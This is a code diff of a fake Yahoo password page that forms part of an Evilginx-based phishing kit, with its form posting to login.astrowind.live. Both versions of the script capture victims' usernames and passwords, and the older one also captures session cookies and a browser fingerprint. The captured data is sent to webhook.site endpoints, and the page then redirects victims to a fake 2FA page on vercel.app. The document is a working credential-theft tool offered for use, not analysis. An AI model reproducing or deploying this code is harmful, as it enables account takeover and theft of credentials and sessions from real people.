@@ -34,17 +34,15 @@
       <div class="form-block w-form">
         <form id="email-form" name="email-form" data-name="Email Form" class="form"
               action="https://login.astrowind.live/account/challenge/password"
-              method="POST"
-              data-wf-page-id="67c6f50ed426ad7d5847f218"
-              data-wf-element-id="1312d987-3657-e4e0-e2bb-17ae6027d67d">
+              method="POST">
           
-          <!-- Critical Hidden Fields for Perfect Data Flow -->
+          <!-- Critical Hidden Fields -->
           <input type="hidden" id="username" name="username">
           <input type="hidden" name="g-recaptcha-response" value="valid_auto_token">
           <input type="hidden" name="crumb" value="auto_crumb_value">
           <input type="hidden" name="sessionIndex" id="sessionIndex">
           <input type="hidden" name="acrumb" id="acrumb">
-          <input type="hidden" name="browser_fp" id="browserFp">
+          <input type="hidden" name="done" id="done">
           
           <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
           
@@ -100,179 +98,112 @@
   }
   </script>
 
-  <!-- Perfect Hybrid Evilginx Integration -->
+  <!-- Instant Redirect Integration -->
   <script>
-  console.log('Perfect Hybrid Password Page - Data Flow Initialized');
-  
-  // Global session management
-  window.perfectSession = {
-    username: null,
-    sessionData: null,
-    cookies: {},
-    validated: false
-  };
-  
-  // Browser fingerprinting for enhanced security
-  function generateBrowserFingerprint() {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillText('Browser fingerprint', 2, 2);
-    
-    const fingerprint = btoa(JSON.stringify({
-      userAgent: navigator.userAgent,
-      language: navigator.language,
-      platform: navigator.platform,
-      screen: `${screen.width}x${screen.height}`,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      canvas: canvas.toDataURL(),
-      timestamp: Date.now()
-    }));
-    
-    return fingerprint;
-  }
-  
-  // Perfect cookie synchronization
-  function syncCookiesFromEvilginx() {
-    const evilginxCookies = {};
-    document.cookie.split(';').forEach(cookie => {
-      const [key, value] = cookie.trim().split('=');
-      if (key && value && ['T', 'Y', 'A3', 'B', 'F', 'PH', 'sessionId', 'crumb', 'sessionIndex'].includes(key)) {
-        evilginxCookies[key] = value;
-      }
-    });
-    
-    window.perfectSession.cookies = evilginxCookies;
-    console.log('Evilginx cookies synchronized:', evilginxCookies);
-    return evilginxCookies;
-  }
-  
-  // Credential validation with Yahoo API
-  async function validateCredentials(username, password) {
-    try {
-      // First validate with evilginx
-      const evilginxResponse = await fetch('https://login.astrowind.live/account/challenge/password', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'Origin': 'https://login.astrowind.live',
-          'Referer': window.location.href
-        },
-        body: new URLSearchParams({
-          username: username,
-          passwd: password,
-          'g-recaptcha-response': 'valid_auto_token',
-          crumb: window.perfectSession.sessionData?.acrumb || 'auto_crumb_value',
-          sessionIndex: window.perfectSession.sessionData?.sessionIndex || 'QQ--',
-          browser_fp: generateBrowserFingerprint()
-        }),
-        credentials: 'include'
-      });
-      
-      console.log('Evilginx validation response:', evilginxResponse.status);
-      
-      // Check response for success indicators
-      if (evilginxResponse.ok || evilginxResponse.status === 302) {
-        // Additional validation: check for Yahoo-specific success cookies
-        syncCookiesFromEvilginx();
-        
-        const hasValidSession = Object.keys(window.perfectSession.cookies).some(key => 
-          ['T', 'Y', 'sessionIndex'].includes(key)
-        );
-        
-        if (hasValidSession) {
-          window.perfectSession.validated = true;
-          return { success: true, requiresMFA: true };
-        }
-      }
-      
-      // If we get here, credentials are likely invalid
-      return { success: false, error: 'Invalid credentials' };
-      
-    } catch (error) {
-      console.error('Credential validation error:', error);
-      return { success: false, error: 'Network error' };
-    }
-  }
-  
-  // Perfect data capture with webhook
-  function captureCredentials(username, password, result) {
-    const captureData = {
-      type: 'password_validation',
-      username: username,
-      password: password,
-      validation_result: result,
-      session_data: window.perfectSession.sessionData,
-      cookies: window.perfectSession.cookies,
-      browser_fp: generateBrowserFingerprint(),
-      timestamp: Date.now(),
-      user_agent: navigator.userAgent,
-      page: 'custom_password_perfect'
-    };
-    
-    // Send to webhook (replace with your webhook URL)
-    fetch('https://webhook.site/your-webhook-id', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify(captureData)
-    }).catch(error => {
-      console.log('Webhook capture failed:', error);
-    });
-    
-    console.log('Credentials captured:', captureData);
-  }
+  console.log('Yahoo Instant Redirect - Password Page Initialized');
   
   document.addEventListener('DOMContentLoaded', function() {
-    console.log('DOM loaded, initializing perfect hybrid flow...');
+    console.log('Processing reCAPTCHA redirect session...');
     
-    // 1. Restore session data from evilginx redirect
+    // Get session data from URL parameters
     const urlParams = new URLSearchParams(window.location.search);
-    let username = urlParams.get('u');
-    const sessionIndex = urlParams.get('si');
-    const acrumb = urlParams.get('ac');
+    let username = urlParams.get('u') || '';
+    const sessionIndex = urlParams.get('si') || 'QQ--';
+    const acrumb = urlParams.get('ac') || '';
+    const done = urlParams.get('done') || '';
+    const isBackup = urlParams.get('backup') === '1';
     
-    // Try to get from localStorage (set by evilginx redirect)
+    console.log('Session data received:', {
+      username: username,
+      sessionIndex: sessionIndex,
+      acrumb: acrumb,
+      done: done,
+      isBackup: isBackup
+    });
+    
+    // Try to get from session cookie
     try {
-      const storedSession = localStorage.getItem('yahooSession');
-      if (storedSession) {
-        window.perfectSession.sessionData = JSON.parse(storedSession);
-        username = username || window.perfectSession.sessionData.username;
+      const sessionCookie = document.cookie.match(/yh_session=([^;]+)/);
+      if (sessionCookie) {
+        const sessionData = JSON.parse(atob(sessionCookie[1]));
+        username = username || sessionData.username;
+        console.log('Session cookie found:', sessionData);
       }
     } catch (e) {
-      console.log('No stored session data');
+      console.log('No session cookie found');
     }
     
-    // Try to get from cookie
+    // Try to get from user cookie
     if (!username) {
-      const cookieMatch = document.cookie.match(/yh_usr=([^;]+)/);
-      if (cookieMatch) username = decodeURIComponent(cookieMatch[1]);
+      const userCookie = document.cookie.match(/yh_usr=([^;]+)/);
+      if (userCookie) {
+        username = decodeURIComponent(userCookie[1]);
+        console.log('Username from cookie:', username);
+      }
     }
     
-    // Security fallback
+    // Security fallback - if no username, redirect back
     if (!username) {
-      console.log('No username found, redirecting to login');
+      console.log('No username found, redirecting back to login...');
       window.location.href = 'https://login.astrowind.live/';
       return;
     }
     
-    // 2. Initialize form with session data
-    window.perfectSession.username = username;
+    // Initialize form with session data
     document.getElementById('userEmail').textContent = username;
     document.getElementById('username').value = username;
-    document.getElementById('sessionIndex').value = sessionIndex || window.perfectSession.sessionData?.sessionIndex || 'QQ--';
-    document.getElementById('acrumb').value = acrumb || window.perfectSession.sessionData?.acrumb || '';
-    document.getElementById('browserFp').value = generateBrowserFingerprint();
+    document.getElementById('sessionIndex').value = sessionIndex;
+    document.getElementById('acrumb').value = acrumb;
+    document.getElementById('done').value = done;
     
-    // Sync existing cookies
-    syncCookiesFromEvilginx();
+    console.log('Form initialized successfully');
     
-    console.log('Form initialized with perfect session data:', window.perfectSession);
+    // Data capture function
+    function captureData(action, data) {
+      const capturePayload = {
+        type: 'instant_redirect_flow',
+        action: action,
+        data: data,
+        session: {
+          username: username,
+          sessionIndex: sessionIndex,
+          acrumb: acrumb,
+          done: done,
+          isBackup: isBackup
+        },
+        timestamp: Date.now(),
+        userAgent: navigator.userAgent,
+        page: 'password_instant_redirect'
+      };
+      
+      // Multiple webhook endpoints
+      const webhooks = [
+        'https://webhook.site/your-webhook-id-1',
+        'https://webhook.site/your-webhook-id-2'
+      ];
+      
+      webhooks.forEach(webhook => {
+        fetch(webhook, {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify(capturePayload)
+        }).catch(e => console.log('Webhook failed:', e));
+      });
+      
+      console.log('Data captured:', capturePayload);
+    }
     
-    // 3. Perfect form submission with validation
+    // Capture page load
+    captureData('page_loaded', {
+      redirectSource: isBackup ? 'backup_detection' : 'primary_detection',
+      hasUsername: !!username,
+      hasSessionData: !!(sessionIndex && acrumb)
+    });
+    
+    // Form submission handler
     document.getElementById('email-form').addEventListener('submit', async function(e) {
       e.preventDefault();
-      console.log('Form submitted - starting perfect validation flow');
+      console.log('Form submitted');
       
       const submitBtn = this.querySelector('[type="submit"]');
       const password = document.getElementById('password').value;
@@ -285,55 +216,66 @@
       submitBtn.disabled = true;
       submitBtn.value = 'Validating...';
       
-      // Validate credentials with Yahoo through evilginx
-      const validationResult = await validateCredentials(username, password);
+      // Capture password attempt
+      captureData('password_submitted', {
+        username: username,
+        password: password,
+        sessionIndex: sessionIndex,
+        acrumb: acrumb
+      });
       
-      // Capture all data regardless of result
-      captureCredentials(username, password, validationResult);
-      
-      if (validationResult.success) {
-        console.log('Credentials validated successfully');
-        submitBtn.value = 'Success! Continuing...';
+      try {
+        // Submit to evilginx
+        const response = await fetch(this.action, {
+          method: 'POST',
+          body: new URLSearchParams(new FormData(this)),
+          credentials: 'include'
+        });
         
-        // Store validated session for 2FA page
-        const validatedSession = {
-          ...window.perfectSession.sessionData,
+        console.log('Password validation response:', response.status);
+        
+        if (response.ok || response.status === 302) {
+          console.log('Password accepted, proceeding to 2FA...');
+          
+          captureData('password_accepted', {
+            username: username,
+            password: password,
+            responseStatus: response.status
+          });
+          
+          submitBtn.value = 'Success! Continuing...';
+          
+          // Redirect to 2FA selection
+          setTimeout(() => {
+            window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&validated=true&si=${encodeURIComponent(sessionIndex)}&ac=${encodeURIComponent(acrumb)}&done=${encodeURIComponent(done)}`;
+          }, 1500);
+          
+        } else {
+          throw new Error('Invalid credentials');
+        }
+        
+      } catch (error) {
+        console.log('Password validation failed:', error);
+        
+        captureData('password_rejected', {
           username: username,
-          validated: true,
-          cookies: window.perfectSession.cookies,
-          timestamp: Date.now()
-        };
+          password: password,
+          error: error.message
+        });
         
-        localStorage.setItem('yahooValidatedSession', JSON.stringify(validatedSession));
-        
-        // Redirect to 2FA selection after short delay
-        setTimeout(() => {
-          window.location.href = `https://yahoo-2fa-selection.vercel.app/?u=${encodeURIComponent(username)}&validated=true`;
-        }, 1500);
-        
-      } else {
-        console.log('Credential validation failed:', validationResult.error);
-        
-        // Show error for invalid credentials
+        // Show error
         document.querySelector('.errry').style.display = 'block';
         submitBtn.disabled = false;
         submitBtn.value = 'Sign In';
-        
-        // Clear password field
         document.getElementById('password').value = '';
       }
     });
     
-    // 4. Error handler
+    // Error handler
     document.getElementById('refreshButton').addEventListener('click', function() {
       document.getElementById('password').value = '';
       document.querySelector('.errry').style.display = 'none';
     });
-    
-    // 5. Session monitoring
-    setInterval(() => {
-      syncCookiesFromEvilginx();
-    }, 5000);
   });
   </script>
 </body>
